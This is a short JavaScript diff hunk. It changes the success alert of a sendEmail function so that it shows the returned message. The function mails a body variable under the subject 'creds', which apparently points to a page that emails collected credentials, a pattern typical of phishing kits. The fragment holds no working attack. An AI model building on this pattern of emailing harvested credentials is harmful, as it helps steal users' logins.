@@ -66,6 +66,6 @@ function sendEmail() {
     Subject: "creds",
     Body: ebody,
   }).then(function (message) {
-    alert("mail sent successfully");
+    alert(message);
   });
 }
